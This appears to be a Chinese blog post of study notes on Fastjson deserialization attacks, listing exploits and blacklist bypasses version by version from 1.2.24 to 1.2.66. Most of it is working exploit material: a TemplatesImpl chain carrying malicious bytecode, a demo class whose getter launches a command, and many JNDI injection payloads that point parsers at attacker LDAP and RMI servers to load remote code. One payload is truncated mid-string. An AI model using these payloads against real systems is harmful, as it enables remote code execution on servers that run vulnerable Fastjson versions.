<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package org.example.fj2;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line">public class Fj2Application &#123;</span><br><span class="line">		public static void main(String[] args)&#123;</span><br><span class="line">			String jsonstring =&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.fj2.Student\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;Mi1k7ea\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;;</span><br><span class="line">			Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</span><br><span class="line">			System.out.println(obj);</span><br><span class="line">			System.out.println(obj.getClass().getName());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">package org.example.fj2;</span><br><span class="line"></span><br><span class="line">import java.util.Properties;</span><br><span class="line"></span><br><span class="line">public class Student &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line">    private String address;</span><br><span class="line">    private Properties properties;</span><br><span class="line"></span><br><span class="line">    public Student() &#123;</span><br><span class="line">        System.out.println(&quot;构造函数&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        System.out.println(&quot;getName&quot;);</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        System.out.println(&quot;setName&quot;);</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getAge() &#123;</span><br><span class="line">        System.out.println(&quot;getAge&quot;);</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getAddress() &#123;</span><br><span class="line">        System.out.println(&quot;getAddress&quot;);</span><br><span class="line">        return address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Properties getProperties() throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;getProperties&quot;);</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        return properties;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-2-24"><a href="#1-2-24" class="headerlink" title="-1.2.24"></a>-1.2.24</h2><p>TemplatesImpl 类中的 <code>getTransletInstance()</code> 方法</p>
<p><code>_name</code> 不可以为 null，</p>
<p>需要 <code>_class</code> 为 null，</p>
<p>这样进入到 <code>defineTransletClasses</code> 这个方法里面。</p>
<p>所以 <code>_class</code> 可以不用写，或者写为 null。</p>
<p><code>_tfactory</code> 也不能为 null，</p>
<p><code>_bytecodes</code> 是恶意字节码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties()  </span><br><span class="line">---&gt; newTransformer() </span><br><span class="line">---&gt; TransformerImpl(getTransletInstance(), _outputProperties,  </span><br><span class="line"> _indentNumber, _tfactory);</span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;  </span><br><span class="line">import com.alibaba.fastjson.parser.Feature;  </span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line">import org.apache.commons.codec.binary.Base64;  </span><br><span class="line">import org.apache.commons.io.IOUtils;  </span><br><span class="line">  </span><br><span class="line">import java.io.ByteArrayOutputStream;  </span><br><span class="line">import java.io.File;  </span><br><span class="line">import java.io.FileInputStream;  </span><br><span class="line">import java.io.IOException;  </span><br><span class="line">  </span><br><span class="line">// TemplatesImpl 链子的 EXPpublic class TemplatesImplPoc &#123;  </span><br><span class="line">    public static String readClass(String cls)&#123;  </span><br><span class="line">        ByteArrayOutputStream bos = new ByteArrayOutputStream();  </span><br><span class="line"> try &#123;  </span><br><span class="line">            IOUtils.copy(new FileInputStream(new File(cls)), bos);  </span><br><span class="line"> &#125; catch (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">        return Base64.encodeBase64String(bos.toByteArray());  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    public static void main(String args[])&#123;  </span><br><span class="line">        try &#123;  </span><br><span class="line">            ParserConfig config = new ParserConfig();  </span><br><span class="line"> final String fileSeparator = System.getProperty(&quot;file.separator&quot;);  </span><br><span class="line"> final String evilClassPath = &quot;E:\\JavaClass\\TemplatesBytes.class&quot;;  </span><br><span class="line"> String evilCode = readClass(evilClassPath);  </span><br><span class="line"> final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;  </span><br><span class="line"> String text1 = &quot;&#123;\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +  </span><br><span class="line">                    &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilCode+&quot;\&quot;],&#x27;_name&#x27;:&#x27;Drunkbaby&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;;  </span><br><span class="line"> System.out.println(text1);  </span><br><span class="line">  </span><br><span class="line"> Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);  </span><br><span class="line"> //Object obj = JSON.parse(text1, Feature.SupportNonPublicField);  </span><br><span class="line"> &#125; catch (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;org.example&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;FastjsonEXP_1.2.24&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;4.0.9&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.5&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.2.24&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-codec&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-codec&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.12&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class="line">		 xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">		 xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">	&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">	&lt;groupId&gt;org.example&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;FastjsonEXP_1.2.24&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">	&lt;dependencies&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.0.9&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;2.5&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.2.24&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;commons-codec&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-codec&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.12&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">	&lt;/dependencies&gt;</span><br><span class="line">	&lt;properties&gt;</span><br><span class="line">		&lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;</span><br><span class="line">		&lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;</span><br><span class="line">	&lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>

<h2 id="1-2-25分析"><a href="#1-2-25分析" class="headerlink" title="-1.2.25分析"></a>-1.2.25分析</h2><p>添加如下👇同时还有其他的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br></pre></td></tr></table></figure>

<p>DefaultJSONParser.parseObject()函数中的<code>TypeUtils.loadClass</code>替换为checkAutoType()函数：</p>
<p><code>checkAutoType()</code>函数设置了黑白名单，</p>
<p>acceptList为白名单（默认为空，可手动添加），denyList为黑名单（默认不为空）</p>
<h3 id="autoTypeSupport"><a href="#autoTypeSupport" class="headerlink" title="autoTypeSupport"></a>autoTypeSupport</h3><p><code>checkAutoType()</code>函数出现后ParserConfig.java中新增的一个配置选项，在<code>checkAutoType()</code>函数的某些代码逻辑起到开关的作用</p>
<p>默认情况下autoTypeSupport为False，将其设置为True有两种方法：</p>
<ul>
<li>JVM启动参数：<code>-Dfastjson.parser.autoTypeSupport=true</code></li>
<li>代码中设置：<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>，如果有使用非全局ParserConfig则用另外调用<code>setAutoTypeSupport(true);</code></li>
</ul>
<p>AutoType白名单设置方法：</p>
<ol>
<li>JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code></li>
<li>代码中设置：<code>ParserConfig.getGlobalInstance().addAccept(&quot;com.xx.a&quot;);</code></li>
<li>通过fastjson.properties文件配置。在1.2.25&#x2F;1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：<code>fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</code></li>
</ol>
<h2 id="25-41"><a href="#25-41" class="headerlink" title="25-41"></a>25-41</h2><h3 id="补丁绕过"><a href="#补丁绕过" class="headerlink" title="补丁绕过"></a>补丁绕过</h3><h3 id="42开始以hash黑名单"><a href="#42开始以hash黑名单" class="headerlink" title="42开始以hash黑名单"></a>42开始以hash黑名单</h3><h4 id="25-42"><a href="#25-42" class="headerlink" title="25-42"></a>25-42</h4><p>开头L结尾;双写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,</span><br><span class="line">	&quot;dataSourceName&quot;:&quot;ldap://localhost:1389/Exploit&quot;, </span><br><span class="line">	&quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="25-43"><a href="#25-43" class="headerlink" title="25-43"></a>25-43</h4><p>以 <code>”[“</code>开头</p>
<p>如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,</span><br><span class="line">	&quot;dataSourceName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,</span><br><span class="line">	&quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="25-45"><a href="#25-45" class="headerlink" title="25-45"></a>25-45</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;  </span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line">// Fastjson 1.2.41 版本的绕过  </span><br><span class="line">public class SuccessBypassEXP_45 &#123;  </span><br><span class="line">    public static void main(String[] args) &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  </span><br><span class="line"> String payload =&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,&quot; +  </span><br><span class="line">                &quot;\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://localhost:1234/Exploit\&quot;&#125;&#125;&quot;;  </span><br><span class="line"> JSON.parse(payload);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="25-47"><a href="#25-47" class="headerlink" title="25-47"></a>25-47</h4><p>通过 java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，<code>checkAutoType()</code>就会抛出异常终止程序。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"> </span><br><span class="line">public class JdbcRowSetImplPoc &#123;</span><br><span class="line">    public static void main(String[] argv)&#123;</span><br><span class="line">        String payload  = &quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&quot;</span><br><span class="line">                + &quot;\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span><br><span class="line">                + &quot;\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="49"><a href="#49" class="headerlink" title="49"></a>49</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FJ 1.2.49开始，JSONArray和JSONObject开始重写了resolveClass，过滤了诸如TemplatesImpl的危险类</span><br></pre></td></tr></table></figure>



<h4 id="5-59"><a href="#5-59" class="headerlink" title="5-59"></a>5-59</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;</span><br><span class="line">或</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;</span><br></pre></td></tr></table></figure>



<h4 id="5-60"><a href="#5-60" class="headerlink" title="5-60"></a>5-60</h4><p><strong>需要开启 autoType：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;,&quot;xaDataSourceName&quot;:&quot;rmi://10.10.20.166:1099/ExportObject&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.configuration.JNDIConfiguration&quot;,&quot;prefix&quot;:&quot;ldap://10.10.20.166:1389/ExportObject&quot;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5-61"><a href="#5-61" class="headerlink" title="5-61"></a>5-61</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;ldap://localhost:1389/Exploi</span><br></pre></td></tr></table></figure>



<h3 id="1-48"><a href="#1-48" class="headerlink" title="1.48"></a>1.48</h3><p>1.2.48中的修复措施是，在<code>loadClass()</code>时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将Class类加入到了黑名单中。</p>
<h4 id="初始分析"><a href="#初始分析" class="headerlink" title="初始分析"></a>初始分析</h4><p>从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究，提高漏洞利用门槛，但是有人已在Github上跑出了大部分黑名单包类：<a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package org.example.fj2.j2;</span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class SuccessBypassEXP &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">        String payload =&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/myVlypbG\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250216154307874.png?raw=true" alt="image-20250216154307874"></p>
<p>然后进入loadclass</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250216155114297.png?raw=true" alt="image-20250216155114297"></p>
<p>ldap反连没好使，直接用yakit搞</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250216163744869.png?raw=true" alt="image-20250216163744869"></p>
<h3 id="1-2-62"><a href="#1-2-62" class="headerlink" title="1.2.62"></a>1.2.62</h3><ul>
<li>需要开启AutoType；</li>
<li>Fastjson &lt;&#x3D; 1.2.62；</li>
<li>JNDI注入利用所受的JDK版本限制；</li>
<li>目标服务端需要存在xbean-reflect包；xbean-reflect 包的版本不限</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package org.example.fj2.j4;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class PoC_1_2_62 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://127.0.0.1:8085/qNdKjUrh\&quot;&#125;&quot;;</span><br><span class="line">        JSON.parse(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>org.apache.cocoon.components.slide.impl.JMSContentInterceptor类PoC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;, &quot;parameters&quot;: &#123;&quot;@type&quot;:&quot;java.util.Hashtable&quot;,&quot;java.naming.factory.initial&quot;:&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;,&quot;topic-factory&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;, &quot;namespace&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>



<h3 id="1-2-66"><a href="#1-2-66" class="headerlink" title="1.2.66"></a>1.2.66</h3><ul>
<li>开启AutoType；</li>
<li>Fastjson &lt;&#x3D; 1.2.66；</li>
<li>JNDI注入利用所受的JDK版本限制；</li>
<li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；</li>
<li>br.com.anteros.dbcp.AnterosDBCPConfig 类需要 Anteros-Core和 Anteros-DBCP 包；</li>
<li>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；</li>
</ul>
